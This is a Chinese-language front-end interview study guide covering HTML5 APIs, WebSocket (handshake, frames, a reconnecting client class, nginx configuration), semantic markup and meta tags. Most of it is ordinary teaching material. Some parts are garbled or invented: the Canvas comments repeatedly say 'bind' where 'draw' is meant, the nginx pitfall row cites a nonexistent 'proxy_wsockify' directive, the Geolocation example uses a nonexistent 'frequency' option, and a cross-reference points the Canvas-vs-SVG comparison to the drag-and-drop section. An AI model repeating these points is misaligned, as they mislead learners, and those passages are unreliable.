# 前端面试全家桶

> 本文档涵盖前端面试中的高频知识点，配套代码示例与图解，助你系统复习、斩获 Offer。
>
> **最后更新：** 2026-05-10 | **版本：** 2.0 | **覆盖：** HTML / CSS / JavaScript / TypeScript / 浏览器 / 网络 / 安全 / React / Vue / 工程化 / 性能优化

<!--toc-->

---

## 一、HTML 超高频八股

---

### 1. HTML5 新特性

HTML5 是 HTML 的第五次重大修改，引入了大量新特性和 API，大幅提升了 Web 应用的能力。

#### 1.1 语义化标签

HTML5 新增了大量语义化标签，使页面结构更清晰、可读性更强：

```html
<!-- 页面结构标签 -->
<header>页面头部</header>
<nav>导航栏</nav>
<main>
  <article>
    <section>文章内容区块</section>
  </article>
  <aside>侧边栏</aside>
</main>
<footer>页面底部</footer>

<!-- 语义化元素 -->
<figure>
  <img src="chart.png" alt="图表">
  <figcaption>图1：2024年数据趋势</figcaption>
</figure>

<mark>高亮文本</mark>
<time datetime="2024-01-01">2024年1月1日</time>
<progress value="70" max="100">70%</progress>
<meter value="3" min="0" max="10">3 of 10</meter>
<details>
  <summary>点击展开</summary>
  展开后的详细内容
</details>
```

**语义化标签的浏览器默认样式：**
- `display: block`（大部分）
- `display: inline`（`mark`, `time`, `span`类似元素）

#### 1.2 多媒体标签

```html
<!-- video 元素 -->
<video width="640" height="480" controls poster="cover.jpg" preload="metadata">
  <source src="movie.mp4" type="video/mp4">
  <source src="movie.webm" type="video/webm">
  <!-- 兼容旧浏览器 -->
  您的浏览器不支持 video 标签。
</video>

<!-- audio 元素 -->
<audio controls>
  <source src="music.mp3" type="audio/mpeg">
  <source src="music.ogg" type="audio/ogg">
  您的浏览器不支持 audio 元素。
</audio>

<!-- source 元素：让浏览器选择支持的格式 -->
<!-- track 元素：字幕 -->
<video src="movie.mp4">
  <track kind="subtitles" src="subs_zh.vtt" srclang="zh" label="中文" default>
  <track kind="subtitles" src="subs_en.vtt" srclang="en" label="English">
</video>
```

**video/audio 常用属性：**
- `controls`：显示播放控件
- `autoplay`：自动播放（现代浏览器需配合 muted）
- `loop`：循环播放
- `muted`：静音
- `preload`：预加载策略（`none`/`metadata`/`auto`）
- `poster`（video专有）：封面图

#### 1.3 表单增强

HTML5 大幅增强了表单功能，引入了大量新的 input 类型和属性：

```html
<form action="/api/submit" method="POST">
  <!-- 新的 input 类型 -->
  <input type="email" placeholder="请输入邮箱" required>
  <input type="url" placeholder="请输入网址">
  <input type="tel" placeholder="请输入手机号" pattern="1[3-9]\d{9}">
  <input type="number" min="0" max="100" step="5" value="50">
  <input type="range" min="0" max="100" value="50" id="range">
  <input type="date">
  <input type="time">
  <input type="datetime-local">
  <input type="month">
  <input type="week">
  <input type="color" value="#ff0000">

  <!-- 新属性 -->
  <input type="text" autocomplete="off" spellcheck="true">
  <input type="text" autofocus>
  <input type="text" multiple> <!-- file input 多选 -->
  <input type="text" pattern="[A-Za-z]{3}">

  <!-- datalist 候选输入 -->
  <input list="browsers" placeholder="选择或输入浏览器">
  <datalist id="browsers">
    <option value="Chrome">
    <option value="Firefox">
    <option value="Safari">
  </datalist>

  <!-- 输出元素 -->
  <output for="range" name="result">50</output>

  <button type="submit">提交</button>
</form>
```

**表单验证 API：**
```javascript
const input = document.querySelector('input[type="email"]');
input.checkValidity(); // 返回布尔值
input.validity.valid;   // 是否有效
input.validity.valueMissing;
input.validity.typeMismatch;
input.validity.patternMismatch;
input.setCustomValidity('自定义错误信息');
input.reportValidity();
```

#### 1.4 Canvas 画布

Canvas 是 HTML5 新增的位图画布，通过 JavaScript 动态绑定绘图：

```javascript
const canvas = document.getElementById('myCanvas');
const ctx = canvas.getContext('2d'); // 2D 绑定

// 设置分辨率（高清屏适配）
const dpr = window.devicePixelRatio;
canvas.width = canvas.offsetWidth * dpr;
canvas.height = canvas.offsetHeight * dpr;
ctx.scale(dpr, dpr);

// 绑定矩形
ctx.fillStyle = '#ff0000';
ctx.fillRect(10, 10, 100, 100);
ctx.strokeStyle = 'blue';
ctx.strokeRect(10, 10, 100, 100);

// 绑定路径
ctx.beginPath();
ctx.moveTo(50, 50);
ctx.lineTo(150, 50);
ctx.lineTo(100, 150);
ctx.closePath();
ctx.fill();

// 绑定文本
ctx.font = '20px Arial';
ctx.fillText('Hello Canvas', 10, 50);

// 绑定图片
const img = new Image();
img.onload = () => ctx.drawImage(img, 0, 0, 200, 200);
img.src = 'image.png';

// 绑定渐变
const gradient = ctx.createLinearGradient(0, 0, 200, 0);
gradient.addColorStop(0, 'red');
gradient.addColorStop(1, 'blue');
ctx.fillStyle = gradient;
ctx.fillRect(0, 0, 200, 100);

// 清空画布
ctx.clearRect(0, 0, canvas.width, canvas.height);
```

**Canvas 与 SVG 的对比（见 1.9 节）**

#### 1.5 Web Storage 本地存储

| 特性 | sessionStorage | localStorage |
|------|----------------|---------------|
| 生命周期 | 标签页关闭即清除 | 永久保存（手动清除） |
| 作用域 | 同源同标签页 | 同源跨标签页共享 |
| 容量 | 约 5MB | 约 5-10MB |
| API | 同步 | 同步 |

```javascript
// localStorage
localStorage.setItem('name', 'Alice');
localStorage.getItem('name');        // 'Alice'
localStorage.getItem('age');         // null（不存在）
localStorage.setItem('age', 25);
localStorage.removeItem('age');
localStorage.clear();

// 只能存字符串，需 JSON 序列化
localStorage.setItem('user', JSON.stringify({ name: 'Alice', age: 25 }));
const user = JSON.parse(localStorage.getItem('user'));

// sessionStorage
sessionStorage.setItem('token', 'abc123');
sessionStorage.getItem('token');

// storage 事件监听（localStorage 跨标签页通信）
window.addEventListener('storage', (e) => {
  console.log('key:', e.key);
  console.log('oldValue:', e.oldValue);
  console.log('newValue:', e.newValue);
  console.log('url:', e.url);
});
```

**IndexedDB：** 大规模结构化数据存储，支持索引、事务，适合离线 Web 应用。

```javascript
const request = indexedDB.open('MyDatabase', 1);

request.onupgradeneeded = (e) => {
  const db = e.target.result;
  if (!db.objectStoreNames.contains('users')) {
    const store = db.createObjectStore('users', { keyPath: 'id' });
    store.createIndex('name', 'name', { unique: false });
  }
};

request.onsuccess = (e) => {
  const db = e.target.result;
  const tx = db.transaction('users', 'readwrite');
  const store = tx.objectStore('users');
  store.add({ id: 1, name: 'Alice', age: 25 });
  store.put({ id: 2, name: 'Bob', age: 30 });
};
```

#### 1.6 WebSocket 全双工通信

##### 1.6.1 定义与核心原理

**WebSocket** 是一种在单个 TCP 连接上提供**全双工（full-duplex）通信**的协议，由 HTML5 标准引入（RFC 6455）。与 HTTP 的"请求→响应"模式不同，WebSocket 建立连接后，服务器和客户端可**随时互相发送数据**，无需每次重新建立连接。

**核心原理：**
- 通过 HTTP handshake（握手）建立连接，随后协议从 HTTP"升级"为 WebSocket
- 连接建立后是持久的 TCP 连接，双方可随时发送帧（frame）
- 头部开销极小（每帧仅 2-14 字节），适合高频数据交换

##### 1.6.2 产生背景：为什么需要 WebSocket？

**传统实时通信方案的困境：**

| 方案 | 原理 | 致命缺陷 |
|------|------|----------|
| 短轮询（Short Polling） | 客户端每隔 N 秒发 HTTP 请求 | 99% 请求是无效的，浪费带宽 |
| 长轮询（Long Polling） | 请求挂起直到服务器有数据 | 仍然是一请求一响应，服务端压力大 |
| 双向通信模拟（ Comet） | 综合轮询+流式传输 | 实现复杂，HTTP 头开销巨大（每个消息带完整 HTTP 头） |

**WebSocket 的诞生：**
- 2011 年，RFC 6455 正式标准化
- 一次 HTTP 握手 → 升级为 WebSocket → 持久 TCP 连接
- 消除 HTTP 头开销，支持任意时刻双向推送
- 适用于：聊天、游戏、实时协作、金融行情、物联网等场景

##### 1.6.3 握手与连接建立流程

```
客户端                                          服务器
  │                                              │
  │  ① HTTP Upgrade 请求                          │
  │  ──────────────────────────────────────────> │
  │  GET /ws HTTP/1.1                             │
  │  Host: api.example.com                        │
  │  Upgrade: websocket                           │
  │  Connection: Upgrade                         │
  │  Sec-WebSocket-Key: dGhlIHNhbXBsZSBb25seQ==  │
  │  Sec-WebSocket-Version: 13                    │
  │                                              │
  │  ② HTTP 101 Switching Protocols              │
  │  <───────────────────────────────────────── │
  │  HTTP/1.1 101 Switching Protocols            │
  │  Upgrade: websocket                          │
  │  Connection: Upgrade                         │
  │  Sec-WebSocket-Accept: SldF1dFZlZWRXbGtleQ== │
  │                                              │
  │  ③ WebSocket 全双工通信开始                  │
  │  <═══════════════════════════════════════>  │
  │  （双向帧传输，无 HTTP 头开销）               │
```

**握手算法（Sec-WebSocket-Key 验证）：**
```javascript
// 客户端生成 Key
const key = 'dGhlIHNhbXBsZSBb25seQ=='; // 示例 key
const MAGIC_STRING = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';
const accept = sha1(key + MAGIC_STRING); // SHA-1 后 base64 编码
// 服务器返回 Sec-WebSocket-Accept，浏览器自动验证
```

##### 1.6.4 帧结构（RFC 6455）

WebSocket 通信的基本单元是**帧（Frame）**，每个帧格式如下：

```
字节 0: FIN + opcode(4) + RSV1-3(3位)
字节 1: MASK(1位) + payload_len(7位)
字节 2-3 (或 2-8): 扩展长度 / Masking-Key

负载数据
```

| 位 | 含义 |
|----|------|
| **FIN**（1位） | 是否是最后一帧（1=是，0=继续帧） |
| **opcode**（4位） | 帧类型：`0x0`=继续帧，`0x1`=文本，`0x2`=二进制，`0x8`=关闭，`0x9`=Ping，`0xA`=Pong |
| **MASK**（1位） | 客户端→服务器必须置 1（数据被掩码） |
| **payload_len**（7位） | 负载长度（<126 直接表示，126=后续2字节，127=后续8字节） |
| **Masking-Key**（32位） | 掩码密钥（仅 MASK=1 时存在） |

**为什么掩码？** 防止恶意代理服务器注入攻击数据。客户端使用 32 位随机密钥对数据做 XOR 掩码，服务端解码。

##### 1.6.5 代码级示例

```javascript
// 客户端 WebSocket 封装（含心跳 + 自动重连）
class RobustWebSocket {
  constructor(url, options = {}) {
    this.url = url;
    this.pingTimeout = options.pingTimeout ?? 8000;     // 发心跳间隔
    this.pongTimeout = options.pongTimeout ?? 15000;     // 收心跳超时
    this.reconnectInterval = options.reconnectInterval ?? 3000;
    this.maxAttempts = options.maxAttempts ?? 10;
    this.attempts = 0;
    this.ws = null;
    this.pingTimer = null;
    this.pongTimer = null;
    this.lockReconnect = false; // 防重复连接
    this.connect();
  }

  connect() {
    try {
      this.ws = new WebSocket(this.url);
      this.ws.onopen = () => this.#onOpen();
      this.ws.onmessage = (e) => this.#onMessage(e);
      this.ws.onerror = (e) => this.#onError(e);
      this.ws.onclose = (e) => this.#onClose(e);
    } catch (e) {
      this.#reconnect();
    }
  }

  // 握手成功后启动心跳
  #onOpen() {
    console.log('[WS] 连接已建立');
    this.attempts = 0;
    this.#startHeartbeat();
  }

  // 收到任何消息 → 重置心跳计时器
  #onMessage(event) {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'pong') {
        this.#resetPongTimer();
      } else {
        this.#handleMessage(data);
      }
    } catch {
      this.#handleMessage(event.data);
    }
    this.#resetPongTimer();
  }

  #onError(error) {
    console.error('[WS] 错误:', error);
  }

  #onClose(event) {
    console.log('[WS] 连接关闭，code:', event.code);
    this.#stopHeartbeat();
    if (event.code !== 1000) { // 非正常关闭则重连
      this.#reconnect();
    }
  }

  #startHeartbeat() {
    this.#stopHeartbeat();
    this.pingTimer = setTimeout(() => {
      if (this.ws?.readyState === WebSocket.OPEN) {
        this.ws.send(JSON.stringify({ type: 'ping', ts: Date.now() }));
        this.#startPongTimer();
      }
    }, this.pingTimeout);
  }

  #stopHeartbeat() {
    clearTimeout(this.pingTimer);
    clearTimeout(this.pongTimer);
  }

  #startPongTimer() {
    this.pongTimer = setTimeout(() => {
      console.warn('[WS] 心跳超时，强制重连');
      this.ws.close();
      this.#reconnect();
    }, this.pongTimeout);
  }

  #resetPongTimer() {
    clearTimeout(this.pongTimer);
  }

  #reconnect() {
    if (this.lockReconnect) return;
    if (this.attempts >= this.maxAttempts) {
      console.error('[WS] 达到最大重连次数');
      return;
    }
    this.lockReconnect = true;
    this.attempts++;
    console.log(`[WS] ${this.reconnectInterval}ms 后第 ${this.attempts} 次重连...`);
    setTimeout(() => {
      this.lockReconnect = false;
      this.connect();
    }, this.reconnectInterval);
  }

  #handleMessage(data) {
    // 业务逻辑子类覆盖
  }

  send(data) {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(data));
    }
  }

  close(code = 1000, reason = 'normal') {
    this.#stopHeartbeat();
    this.ws?.close(code, reason);
  }
}

// 使用
const ws = new RobustWebSocket('wss://api.example.com/ws', {
  pingTimeout: 8000,
  pongTimeout: 15000,
  reconnectInterval: 3000,
  maxAttempts: 10
});
```

##### 1.6.6 常见应用场景

| 场景 | 说明 | 为什么选 WebSocket |
|------|------|------------------|
| 即时聊天（IM） | 消息实时送达 | 全双工，高频双向推送 |
| 在线游戏 | 帧同步，延迟敏感 | 低延迟，支持二进制帧 |
| 实时协作编辑 | 多人同时编辑同一文档 | 双向推送，即时同步 |
| 金融行情 | 股票/加密货币价格实时更新 | 高频单向推送（可考虑 SSE） |
| 物联网（IoT） | 设备状态实时上报 | 持久连接，减少电量消耗 |
| 视频会议 | 信令（SDP/ICE）传输 | 低延迟可靠传输 |
| 直播弹幕 | 弹幕实时显示 | 连接量大的推送场景 |

##### 1.6.7 为什么不直接用轮询？重连策略详解

**为什么不用轮询？**
```
短轮询：每 5 秒一次 → 每天 17280 次 HTTP 请求，其中 99% 无数据返回
长轮询：请求挂起 → 服务端并发受限 → 1 万并发用户需要 1 万个挂起连接

WebSocket：一次握手持久连接 → 每天仅 1 次握手 + 心跳包（每 30 秒）
HTTP 头对比：HTTP 请求头 ~500 字节 vs WebSocket 帧头 2 字节
           → 带宽节省 ~99.6%
```

**重连策略（指数退避 + 抖动）：**
```javascript
#reconnect() {
  // 指数退避：1s → 2s → 4s → 8s... 上限 30s
  const delay = Math.min(30000, this.reconnectInterval * Math.pow(2, this.attempts - 1));
  // 随机抖动 ±30%，避免惊群效应
  const jitter = delay * (0.7 + Math.random() * 0.6);
  setTimeout(() => this.connect(), jitter);
}
```

##### 1.6.8 WebSocket vs HTTP vs SSE vs 长轮询（完整对比表）

| 维度 | HTTP 轮询 | 长轮询 | **SSE** | **WebSocket** |
|------|:---------:|:------:|:-------:|:------------:|
| 方向 | 客户端→服务端 | 客户端→服务端 | **服务端→客户端** | **双向全双工** |
| 连接特性 | 短连接 | 挂起连接 | 长连接（持久） | 长连接（持久） |
| 协议基础 | HTTP | HTTP | HTTP（text/event-stream） | TCP（升级） |
| 头部开销 | 高（每请求） | 高 | 低（仅首次） | **极低（每帧 2 字节）** |
| 服务器推送 | ❌ | ❌ | ✅ | ✅ |
| 客户端推送 | ✅ | ✅ | ❌ | ✅ |
| 断线重连 | 浏览器自动 | 浏览器自动 | **自动重连** | **需手动实现** |
| 二进制支持 | ✅（Base64/表单） | ✅ | ❌（仅文本） | ✅（原生二进制帧） |
| 兼容性 | 极高 | 高 | IE 不支持 | 现代浏览器 |
| 实现复杂度 | 低 | 中 | 低 | 中高 |
| 适用场景 | 低频轮询 | 中频轮询 | **推送通知、聊天、实时数据** | **实时游戏、双向协作** |
| 可穿透防火墙 | ✅ | ✅ | ✅ | ✅（HTTP 升级） |
| 支持代理 | ✅ | ✅ | 部分 | 部分（可能降级为 HTTP） |

> **选型建议：**
> - **只需服务端推送**（如通知、实时数据、股票行情）→ SSE（实现简单，自动重连，原生 HTTP）
> - **需要双向通信**（聊天、游戏、实时协作）→ WebSocket
> - **低频轮询**（每隔几十秒查一次）→ 短轮询（最简单的方案）
> - **高频单向推送，但浏览器不支持 SSE** → WebSocket

##### 1.6.9 常见坑点与最佳实践

| 坑点 | 说明 | 解决方案 |
|------|------|----------|
| **代理服务器截断** | 某些代理服务器不认识 WebSocket 升级，可能关闭连接 | 使用 WSS（TLS 加密）；配置 nginx proxy_read_timeout |
| **连接数限制** | 浏览器同源 WebSocket 连接数有限制（各浏览器不同） | 使用连接池；或用 SSE 代替单向推送 |
| **心跳被浏览器节流** | 页面后台时 setTimeout 可能被合并 | 使用 `visibilitychange` 事件，页面不可见时停止心跳 |
| **消息丢失** | 网络断开时 send 的消息不会自动重发 | 应用层实现确认机制（ACK）+ 重发队列 |
| **粘包/拆包** | 消息可能被分割或合并 | 自定义消息边界（长度前缀 / 分隔符 / JSON envelope） |
| **重连风暴** | 大面积断线后所有客户端同时重连 | **指数退避 + 随机抖动** |
| **内存泄漏** | onmessage 中不断创建对象未释放 | 对象池复用；注意定时器未清理 |
| **TLS 终止前泄露** | 在 nginx 前面终止 TLS 时数据不加密 | nginx 1.3.13+ 支持 proxy_wsockify |
| **nginx 默认超时** | nginx 默认 proxy_read_timeout 60s | 设置 `proxy_read_timeout 86400;` |

**Nginx WebSocket 配置：**
```nginx
location /ws {
    proxy_pass http://backend;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_read_timeout 86400;       # 24 小时不断连
    proxy_send_timeout 86400;
}
```

##### 1.6.10 高频面试追问

**Q1：WebSocket 断线后如何保证消息可靠性？**
> 采用应用层 ACK + 重发队列机制：
> 1. 每条消息带唯一 `id`
> 2. 发送后等待服务端 `ack`（N 秒内未收到则重发）
> 3. 服务端维护去重集合（Set），收到重复 `id` 直接返回 `ack` 不重复处理
> 4. 对于极高可靠性场景，使用 MQ（Kafka/RabbitMQ）作为消息总线

**Q2：WebSocket 如何实现房间/群组功能？**
> 方案一：**服务端维护路由表** —— 每个连接 fd 关联一个 userId；joinRoom 时在 Redis/内存中建立 userId → [fd] 映射；广播时遍历房间内所有 fd
> 方案二：**消息中携带房间 ID** —— 客户端发送时带 `roomId`，服务端路由根据消息 `roomId` 转发到对应订阅者
> 方案三：**使用 Socket.IO 等封装库** —— 库自带 rooms 抽象，内部处理 fd 与房间映射

**Q3：WebSocket 与 WebRTC 如何选型？**
> WebSocket：适合**应用层数据**（文本/JSON，二进制协议），基于 TCP，可靠传输
> WebRTC：适合**媒体流**（音视频），基于 UDP，低延迟，支持 P2P 直连
> 实际架构：WebSocket 用于信令通道（交换 SDP/ICE），WebRTC 用于实际媒体传输

**Q4：如何检测 WebSocket 连接是否真正存活？**
> 仅靠 `onopen` 不够——可能网络已断开但 TCP 连接未检测到关闭。
> 正确做法：定期发送**应用层心跳**（ping/pong），在 `onmessage` 中重置计时器；若计时器超时则判定为断连。
> RFC 6455 原生提供 Ping/Pong 帧（opcode 0x9/0xA），但浏览器的 WebSocket API **不暴露**这些帧，需自行用 JSON 消息模拟。

> 📚 参考：
> - [RFC 6455 - The WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)
> - [MDN WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)
> - [实时技术对比: SSE vs WebSocket vs Long Polling](https://cloud.tencent.com/developer/article/2521124)
> - [WebSocket心跳重连机制](https://cloud.tencent.com/developer/article/2182509)

##### 1.6.11 与 SSE 的关联

> ⚠️ **注意：SSE（Server-Sent Events）是 6.13 节的网络协议知识点，在"HTML 新特性"部分仅简介。SSE 的详细原理、代码示例、与 WebSocket 的完整对比请详见 **Chapter 6 第 6.13 节**。
>
> 在 HTML 章节中你需要掌握的：SSE 是**单向**（服务端→客户端）的实时通信技术，使用 `EventSource` API，在只需要服务器推送的场景下（通知、实时数据）比 WebSocket 轻量得多，且**原生支持自动重连**。

#### 1.7 History API 与路由

History API 允许 JavaScript 操作浏览器历史记录，实现无刷新页面切换：

```javascript
// 导航
history.pushState({ page: 1 }, 'Page 1', '/page1');
history.replaceState({ page: 2 }, 'Page 2', '/page2');

// 前进/后退
history.back();      // 后退
history.forward();   // 前进
history.go(-2);      // 后退两步

// 监听浏览器前进/后退（popstate 事件）
window.addEventListener('popstate', (event) => {
  if (event.state) {
    console.log('当前页面状态:', event.state);
    renderPage(location.pathname);
  }
});

// 监听链接点击（单页应用路由示例）
document.addEventListener('click', (e) => {
  const link = e.target.closest('a[data-spa]');
  if (link) {
    e.preventDefault();
    const url = link.getAttribute('href');
    history.pushState(null, '', url);
    renderPage(url);
  }
});
```

**pushState/replaceState 区别：**
- `pushState`：创建新历史记录（可后退）
- `replaceState`：替换当前历史记录（不可后退）

#### 1.8 Geolocation 地理定位

```javascript
if (navigator.geolocation) {
  // 获取当前位置
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const { latitude, longitude, accuracy } = position.coords;
      console.log(`纬度: ${latitude}, 经度: ${longitude}, 精度: ${accuracy}m`);
    },
    (error) => {
      switch (error.code) {
        case error.PERMISSION_DENIED: console.log('用户拒绝定位'); break;
        case error.POSITION_UNAVAILABLE: console.log('位置不可用'); break;
        case error.TIMEOUT: console.log('请求超时'); break;
      }
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );

  // 持续监听位置变化
  const watchId = navigator.geolocation.watchPosition(
    (position) => { /* 持续更新 */ },
    null,
    { frequency: 5000 }
  );

  // 停止监听
  navigator.geolocation.clearWatch(watchId);
}
```

#### 1.9 Drag and Drop 拖放 API

```html
<div id="source" draggable="true" style="width:100px;height:100px;background:red;"></div>
<div id="target" style="width:200px;height:200px;background:#eee;margin-top:20px;"></div>
```

```javascript
const source = document.getElementById('source');
const target = document.getElementById('target');

// 被拖拽元素
source.addEventListener('dragstart', (e) => {
  e.dataTransfer.setData('text/plain', 'Hello');
  e.dataTransfer.effectAllowed = 'copy';
  console.log('开始拖拽');
});

source.addEventListener('dragend', (e) => {
  console.log('拖拽结束');
});

// 目标元素
target.addEventListener('dragover', (e) => {
  e.preventDefault(); // 阻止默认行为（允许 drop）
  e.dataTransfer.dropEffect = 'copy';
});

target.addEventListener('dragenter', (e) => {
  target.style.background = '#ddd';
});

target.addEventListener('dragleave', (e) => {
  target.style.background = '#eee';
});

target.addEventListener('drop', (e) => {
  e.preventDefault();
  const data = e.dataTransfer.getData('text/plain');
  console.log('接收到数据:', data);
  target.textContent = data;
});
```

---

### 2. HTML 语义化

#### 2.1 定义与核心原理

**HTML 语义化**是指使用具有明确含义的 HTML 标签来描述页面结构和内容，使机器（浏览器、爬虫、屏幕阅读器）和开发者都能理解代码的意图。

**核心原则：**
> "Use an element for its intended purpose. If it is a button, use `<button>`. If it is a link, use `<a>`."

```html
<!-- 非语义化写法 -->
<div class="header">
  <div class="nav">
    <div class="nav-item">首页</div>
  </div>
</div>
<div class="content">
  <div class="article">
    <div class="title">文章标题</div>
    <div class="text">文章内容...</div>
  </div>
</div>

<!-- 语义化写法 -->
<header>
  <nav>
    <a href="/">首页</a>
  </nav>
</header>
<main>
  <article>
    <h1>文章标题</h1>
    <p>文章内容...</p>
  </article>
</main>
```

**语义化的核心价值：**

| 维度 | 价值 |
|------|------|
| **可访问性（a11y）** | 屏幕阅读器能正确识别页面结构，视觉障碍用户可顺畅导航 |
| **SEO** | 搜索引擎能理解页面主题和内容层级，提升排名和摘要质量 |
| **可维护性** | 开发者通过标签名即可理解代码意图，降低协作成本 |
| **跨设备兼容** | 语义化结构在解析时更稳定，不依赖特定 CSS 类名或样式 |

#### 2.2 产生背景与历史演进

**为什么需要语义化标签？**

| 历史阶段 | 特征 | 问题 |
|---------|------|------|
| HTML 4.01 | `<div>` 被大量滥用做布局 | 机器无法区分"导航区"和"正文区" |
| XHTML 1.0 | 严格语法，推动标准化 | 仍缺乏页面结构语义 |
| **HTML5（2014）** | 引入 `<header>/<nav>/<article>/<section>/<main>` | 浏览器兼容性（现均已解决） |
| WCAG 2.1（2018） | POUR 原则系统化 | 与 HTML5 语义化并行发展 |
| WAI-ARIA 1.2（2023） | 自定义组件语义补充 | 针对复杂 SPA 组件 |

**语义化解决了 5 个核心问题：**
1. **`<div>` 地狱**：机器无法区分 `div class="nav"` 和 `div class="sidebar"`
2. **SEO 瓶颈**：早期爬虫靠 title/meta/关键词密度，无法理解页面结构层次
3. **无障碍鸿沟**：视障用户依赖屏幕阅读器，`div` 对阅读器毫无含义
4. **可维护性危机**：`div class="box-1"` 对新加入的开发者零含义提示
5. **跨团队协作**：设计师、前端、后端需要共同的结构语言

#### 2.3 运行机制：浏览器如何解析语义标签

```
HTML 源码
  ↓
[解析器 Parser] → 构建 DOM 树（所有节点，包括语义元素）
  ↓
[CSS 计算] → 样式计算（UA 样式表对语义元素有默认样式）
  ↓
[Accessibility Tree 生成]
  ↓  映射为 Accessibility API
  ↓  (Windows: IAccessible2 / macOS: NSAccessibility / Linux: ATK)
  ↓
屏幕阅读器（NVDA/JAWS/VoiceOver）消费 Accessibility API
```

**UA 样式表内置语义：**
```css
/* 浏览器内置默认样式（Chrome 简化示例） */
nav, main, article, section, aside, header, footer { display: block; }
button {
  display: inline-block;
  /* 内置 focus ring、cursor: pointer、border 等 */
}
a { color: -webkit-link; text-decoration: underline; }
```

#### 2.4 代码级示例：完整语义化页面模板

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>前端技术博客 — 文章列表</title>
  <!-- schema.org JSON-LD 结构化数据 -->
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "BlogPosting",
    "headline": "前端技术博客",
    "author": { "@type": "Person", "name": "张三" },
    "datePublished": "2026-05-10"
  }
  </script>
</head>
<body>
  <!-- 跳链：键盘用户直接跳过导航到主要内容 -->
  <a href="#main-content" class="skip-link">跳转到主要内容</a>

  <header role="banner">
    <nav role="navigation" aria-label="主导航">
      <ul>
        <li><a href="/" aria-current="page">首页</a></li>
        <li><a href="/articles">文章</a></li>
      </ul>
    </nav>
  </header>

  <main id="main-content" role="main">
    <section aria-labelledby="section-title">
      <h1 id="section-title">最新文章</h1>
      <article>
        <header>
          <h2>CSS Grid 布局实战</h2>
          <p>
            <time datetime="2026-05-10">2026年5月10日</time>
          </p>
        </header>
        <figure>
          <img src="grid-demo.png" alt="CSS Grid 三栏布局示意图" width="800" height="400">
          <figcaption>图1: CSS Grid 三栏响应式布局示例</figcaption>
        </figure>
        <footer>
          <a href="/tag/css" rel="tag">CSS</a>
        </footer>
      </article>
    </section>
  </main>

  <aside role="complementary" aria-label="侧边栏">
    <section aria-labelledby="popular-title">
      <h3 id="popular-title">热门文章</h3>
      <ul>
        <li><a href="/article-2">React 18 新特性</a></li>
      </ul>
    </section>
  </aside>

  <footer role="contentinfo">
    <nav aria-label="页脚导航">
      <a href="/privacy">隐私政策</a>
    </nav>
  </footer>
</body>
</html>
```

#### 2.5 `<section>` vs `<article>` vs `<div>` 区别

| 维度 | `<section>` | `<article>` | `<div>` |
|------|-------------|-------------|---------|
| 语义 | 文档中的章节（主题相关） | 独立可分发的内容单元 | 纯容器，无语义 |
| 标题 | **一般需要 `<h1>-<h6>`**（规范要求） | 通常有标题 | 无要求 |
| 使用场景 | 书籍章节、功能区块 | 博客文章、新闻、产品卡片 | 纯粹视觉分组、CSS 样式钩子 |
| 独立性 | 依赖周围内容 | **可独立存在**，脱离上下文仍完整 | 无所谓独立 |
| 对应 ARIA | `role="region"` | `role="article"` | 无默认 ARIA role |

> **黄金判断法**："这段内容拔出来放在 RSS 订阅里，读者能看懂吗？" 能 → `<article>`；不能但有意义关联 → `<section>`；纯布局 → `<div>`。

#### 2.6 高频面试追问

**Q1：`<div role="banner">` 和 `<header>` 在无障碍层面是完全等价的吗？**
> 不完全等价。`<header>` 在**顶级页面**时语义等价于 `role="banner"`，但当 `<header>` 嵌套在 `<article>` 或 `<section>` 内时，它的语义变为"该区块的头部"，而非整页 banner。
> `<div role="banner">` 始终声明为 banner，不受嵌套影响。
> **建议**：优先使用原生语义标签 `<header>`，只有在无法用原生标签时才用 ARIA。

**Q2：为什么 `<button>` 比 `<div onclick>` 更好？**
> `<button>` 原生具有：键盘可操作（Space/Enter）、聚焦管理、内置 `cursor: pointer`、无障碍角色声明、UA 样式、禁止文本选择等行为。
> `<div onclick>` 需要手动补充 `tabindex="0"`、`onkeydown`（处理 Enter/Space）、`role="button"`、CSS 样式——而这些只要一个 `<button>` 标签就全部覆盖了。

**Q3：屏幕阅读器读取 SPA 时，JavaScript 动态注入的内容能被感知吗？**
> 默认情况下**不能感知**。解决方案：
> 1. **ARIA Live Regions**：动态内容区域设置 `aria-live="polite"`（不打断）或 `"assertive"`（打断）
> 2. **MutationObserver**：监听 DOM 变化，向 live region 写入内容
> 3. **路由切换时焦点管理**：SPA 路由跳转后，用 `focus()` 将焦点移到新页面的 `<main>` 或 `<h1>`

**Q4："No ARIA is better than bad ARIA" 这句话怎么理解？**
> WebAIM 2024 年调查数据显示：使用 ARIA 的页面平均无障碍错误率高出 41%。
> 原因：冗余 ARIA（如 `<nav role="navigation">`）、错误状态同步（如 `aria-checked` 但 DOM 未更新）、过时的 ARIA 属性。
> **原则**：能用原生 HTML 实现的功能，坚决不用 ARIA。

> 📚 参考：
> - [MDN — HTML Semantic Elements](https://developer.mozilla.org/en-US/docs/Web/HTML/Element)
> - [MDN — ARIA Roles](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles)
> - [W3C WAI — WCAG 2.1](https://www.w3.org/WAI/standards-guidelines/wcag/)
> - [Schema.org — JSON-LD](https://schema.org/docs/gs.html)

---

### 3. meta 标签

#### 3.1 定义与核心原理

`<meta>` 标签位于 `<head>` 中，提供关于 HTML 文档的元数据，不会显示在页面上，但机器（浏览器、爬虫、社交平台）可读取。

**核心原理：**
- meta 标签是**声明性元数据**，不是文档内容
- 浏览器、搜索引擎、社交平台爬虫都会解析 `<head>` 中的 meta
- 错误的 meta 设置可能导致：乱码、布局错乱、SEO 降权、社交分享失败

#### 3.2 字符编码（charset）

```html
<!-- ✅ 推荐写法（HTML5 简化语法） -->
<meta charset="UTF-8">

<!-- ❌ 不推荐（HTML4 兼容写法） -->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
```

